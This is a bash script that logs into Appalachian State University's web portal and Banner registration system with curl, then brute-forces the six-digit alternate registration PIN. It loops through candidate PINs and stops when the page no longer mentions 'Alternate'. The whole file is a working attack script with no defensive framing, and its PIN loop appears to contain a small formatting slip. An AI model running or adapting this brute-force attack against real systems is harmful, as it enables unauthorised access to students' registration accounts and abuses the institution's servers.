#!/bin/bash
username=app_username
password=app_password
curl -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu/cp/home/displaylogin" -o receipt
curl -L -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu/cp/home/displaylogin"
curl -L -b cookies.txt -c cookies.txt -X POST --data "user=$username&pass=$password" --url "https://portal4.appstate.edu/cp/home/login" -o receipt
curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://portal4.appstate.edu:443/cp/ip/login?sys=sct&url=http%3A%2F%2Fportal4.appstate.edu%2Fcp%2Fip%2Flogin%3Fsys%3Dsct%26api%3Dbmenu.P_GenMnu"
curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "http://portal4.appstate.edu/cp/ip/login?sys=sct&api=bmenu.P_GenMnu"
curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/bzwkrvtrns.p_display_revtrans_from_login"
curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_MainMnu"
curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_StuMainMnu"
curl -L -o receipt -b cookies.txt -c cookies.txt -X GET --url "https://bannerweb.appstate.edu:443/pls/PROD/twbkwbis.P_GenMenu?name=bmenu.P_RegMnu"
curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data 'term_in=201540' --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_AltPin" -o receipt

for pin in `seq -f "%06g"0 999999`; do
  echo $pin
  curl -L -b cookies.txt -c cookies.txt -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate, sdch' --data "pin=$pin" --referer "https://bannerweb.appstate.edu/pls/PROD/bwskfreq.P_AltPin" --url "https://bannerweb.appstate.edu:443/pls/PROD/bwskfreg.P_CheckAltPin" -o receipt
    if [ ! -n "`cat receipt | grep Alternate`" ]; then
      echo "Pin found: $pin"  
      break
    fi
  sleep .5
done
